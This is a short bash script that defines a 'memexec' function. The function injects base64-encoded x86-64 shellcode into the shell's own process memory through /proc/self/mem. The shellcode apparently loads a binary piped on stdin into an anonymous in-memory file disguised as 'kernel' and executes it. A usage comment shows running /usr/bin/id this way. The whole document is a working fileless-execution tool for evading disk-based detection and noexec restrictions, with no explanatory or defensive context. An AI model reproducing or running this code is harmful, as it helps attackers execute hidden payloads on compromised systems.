#! /bin/bash

memexec() { bash -c 'cd /proc/$$;exec 4>mem;base64 -d<<<SInlSIHsEgQAAEi4a2VybmVsAABqAFC4PwEAAEiJ50gx9g8FSYnAuAAAAAC/AAAAAEiJ5roABAAADwVIicJIg/oAfg+4AQAAAEyJx0iJ5g8F69S4QgEAAEyJx2oASInmagBUSIniSDHJTTHJTTHSQbgAEAAADwW4PAAAAL9jAAAADwU=|dd bs=1 seek=$[$(cat syscall|cut -f9 -d" ")]>&4'; }

# Example: cat /usr/bin/id | memexec 

